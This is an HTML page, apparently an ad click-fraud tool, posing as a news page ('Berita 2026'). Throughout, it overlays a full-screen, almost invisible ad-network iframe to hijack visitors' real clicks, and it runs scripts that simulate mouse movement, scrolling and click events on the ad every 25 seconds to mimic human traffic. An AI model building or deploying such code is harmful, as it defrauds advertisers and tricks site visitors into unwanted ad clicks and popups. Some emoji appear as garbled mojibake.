<!DOCTYPE html>
<html>
<head>
    <title>ðŸ“° FULL AUTO - DIRECT IFRAME</title>
    <style>
        body { font-family: Arial; background: #f0f0f0; margin: 0; padding: 20px; }
        #status { background: #4CAF50; color: white; padding: 15px; border-radius: 5px; }
        #adFrame { 
            position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; 
            border: none; z-index: 9999; opacity: 0.1; pointer-events: auto;
        }
        .news { background: white; padding: 20px; margin: 10px 0; border-radius: 8px; }
    </style>
</head>
<body>

<div id="status">ðŸš€ FULL AUTO DIRECT - Loading...</div>
<div class="news">
    <h2>ðŸ“° Berita 2026</h2>
    <div>Score: <span id="score">0</span> | Clicks: <span id="clicks">0</span></div>
</div>

<!-- DIRECT IFRAME - SELALU VISIBLE -->
<iframe id="adFrame" src="https://www.effectivegatecpm.com/bdzwmnqkv?key=1aa444e7a4b2342a953947ed211aefcd" sandbox="allow-scripts allow-same-origin allow-popups allow-popups-to-escape-sandbox"></iframe>

<script>
console.log("ðŸ”¥ DIRECT IFRAME - REAL CLICKS");

let score = 0, clicks = 0;

// SIMULASI HUMAN (mouse bergerak SENDIRI)
function humanSim() {
    setInterval(() => {
        // Mouse move simulation
        document.dispatchEvent(new MouseEvent("mousemove", {
            clientX: Math.random() * 1920, clientY: Math.random() * 1080
        }));
        score += 0.3;
        document.getElementById("score").textContent = Math.floor(score);
    }, 80);
    
    // Auto scroll
    setInterval(() => window.scrollBy(0, 50), 2000);
}

// REAL AD CLICKS
function clickAd() {
    const frame = document.getElementById("adFrame");
    const rect = frame.getBoundingClientRect();
    
    // 8 POSISI RANDOM (human-like)
    const positions = [
        {x: 0.2, y: 0.3}, {x: 0.4, y: 0.4}, {x: 0.6, y: 0.35},
        {x: 0.3, y: 0.6}, {x: 0.7, y: 0.5}, {x: 0.5, y: 0.2},
        {x: 0.8, y: 0.7}, {x: 0.1, y: 0.5}
    ];
    
    const pos = positions[Math.floor(Math.random() * positions.length)];
    const x = rect.left + rect.width * pos.x;
    const y = rect.top + rect.height * pos.y;
    
    console.log("ðŸ’¥ CLICK at", x, y);
    
    // FULL CLICK CHAIN
    ["mouseover", "mouseenter", "mousedown", "click", "mouseup"].forEach((type, i) => {
        setTimeout(() => {
            const evt = new MouseEvent(type, {
                bubbles: true, cancelable: true,
                clientX: x, clientY: y, button: 0
            });
            frame.dispatchEvent(evt);
            document.elementFromPoint(x, y)?.dispatchEvent(evt);
        }, i * 150);
    });
    
    clicks++;
    document.getElementById("clicks").textContent = clicks;
    document.getElementById("status").textContent = `âœ… CLICK #${clicks} SUCCESS! Next: 25s`;
}

humanSim();

// AUTO CYCLE - MULAI 3 DETIK
setTimeout(() => {
    document.getElementById("status").textContent = "ðŸš€ AUTO START - First click...";
    setTimeout(clickAd, 3000);
}, 1000);

// LOOP SELAMANYA (20-40 detik)
setInterval(clickAd, 25000);

console.log("âœ… DIRECT IFRAME ACTIVE - Popup/Tab akan muncul!");
</script>
</body>
</html>
